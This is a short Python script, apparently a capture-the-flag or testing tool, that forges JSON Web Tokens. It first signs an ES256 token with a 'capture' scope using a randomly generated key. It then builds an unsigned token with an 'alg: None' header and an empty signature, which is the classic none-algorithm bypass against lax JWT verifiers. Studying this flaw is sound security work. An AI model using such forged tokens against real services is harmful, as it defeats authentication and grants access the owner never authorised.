import base64
import sys
import json
import time
from binascii import hexlify
from hashlib import sha256
from random import randrange
from jwcrypto import jwk

import jwt
import ecdsa

from ecdsa import SigningKey, NIST256p, numbertheory, VerifyingKey, der
from jwt.utils import base64url_decode, base64url_encode

with open("key.pem") as key_file:
    pem = key_file.readlines()
pem = ''.join(pem)

#sk = SigningKey.from_pem(pem, hashfunc=sha256)
sk = SigningKey.generate(curve=NIST256p, hashfunc=sha256)
jwk = jwk.JWK.from_pem(sk.to_pem())

now = int(time.time())

def generate_jwt(payload):
    data = jwt.encode(payload, jwk.export_to_pem(private_key=True, password=None), algorithm="ES256")
    print(f"{payload}: {data}")

payload = {
    "exp": now + 3600,
    "scopes": "capture"
}

generate_jwt(payload)


header = json.dumps({"alg": "None"})
body = json.dumps({"exp": now+3600, "claims": ["capture"]})

jwt = ''
jwt += base64url_encode(header.encode('utf-8')).decode('utf-8')
jwt += '.'
jwt += base64url_encode(body.encode('utf-8')).decode('utf-8')
jwt += '.'
print(jwt)